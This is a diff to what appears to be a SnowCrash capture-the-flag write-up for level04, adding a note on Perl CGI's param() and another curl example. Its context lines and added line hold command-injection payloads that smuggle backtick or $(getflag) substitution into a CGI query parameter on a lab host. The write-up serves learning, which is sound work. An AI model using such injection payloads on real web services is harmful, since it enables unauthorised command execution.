@@ -14,8 +14,10 @@ an interface specification that enables web servers to execute an external progr
 level04@SnowCrash:~$ /usr/bin/perl level04.pl
 Content-type: text/html
 
-
 ```
+
+ the most important CGI function is param(). Call it with the name of a form item, and a list of all the values of that form item will be returned.
+ https://www.perl.com/pub/2000/12/begperl4.html/
 
 quick google on how Sending Parameters via [cURL](http://conqueringthecommandline.com/book/curl#uid105)
 ?param=
@@ -59,6 +61,7 @@ other alternative of command substitution is using the ``
 ```
 curl localhost:4747?x='`getflag`'
 curl localhost:4747?x=\`getflag\`
+curl http://127.0.0.1:4747?x='$(getflag)'
 ```
 or in the browser
 http://10.12.100.98:4747/?x=`getflag`
